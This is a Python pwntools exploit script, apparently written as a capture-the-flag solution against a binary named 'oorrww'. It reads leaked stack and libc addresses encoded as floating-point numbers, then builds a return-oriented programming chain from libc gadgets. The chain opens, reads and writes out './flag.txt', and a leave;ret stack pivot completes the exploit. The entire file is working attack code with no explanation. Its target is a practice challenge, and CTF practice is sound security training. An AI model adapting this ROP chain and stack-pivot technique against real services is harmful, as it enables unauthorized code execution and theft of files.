#!/bin/usr/python3

from pwn import *
import struct

p = remote("localhost", 9999)#, level="debug")
e = ELF('./oorrww', )
libc = ELF('./libc.so.6')

def float_str_to_int(str):
    return u64(struct.pack("<d", float(str)))

def int_to_float_str(num):
    return (str(struct.unpack("<d", p64(num))).encode("ascii"))[1:-2]

p.recvuntil(b'you: ')
buf = float_str_to_int(p.recvuntil(b' ')[:-1])
libc_base = float_str_to_int(p.recvuntil(b'!')[:-1]) - libc.symbols["__isoc99_scanf"]

print("buf: ", hex(buf))
print("libc_base: ", hex(libc_base))

leave_ret = libc_base + 0x4da83
pop_rdi = libc_base+ 0x2a3e5
pop_rsi = libc_base+0x2be51
pop_rdx_r12 = libc_base+0x11f2e7

payload = []

payload.append(pop_rdi)
payload.append(buf+0x80)
payload.append(pop_rsi)
payload.append(0)
payload.append(libc_base+libc.symbols["open"])

payload.append(pop_rdi)
payload.append(3) # fd
payload.append(pop_rsi)
payload.append(buf+0x1000)
payload.append(pop_rdx_r12)
payload.append(0x100)
payload.append(0)
payload.append(libc_base+libc.symbols["read"])


payload.append(pop_rdi)
payload.append(1)
payload.append(libc_base+libc.symbols['write'])
payload.append(u64(b'./flag.t'))
payload.append(u64(b'xt\x00\x00\x00\x00\x00\x00'))
payload.append(0)

for i in range(19):
    p.sendlineafter(b"input:\n", int_to_float_str(payload[i]))
    
p.sendlineafter(b"input:\n", b".")

p.sendlineafter(b"input:\n", int_to_float_str(buf-0x8))
pause()
p.sendlineafter(b"input:\n", int_to_float_str(leave_ret))

p.interactive()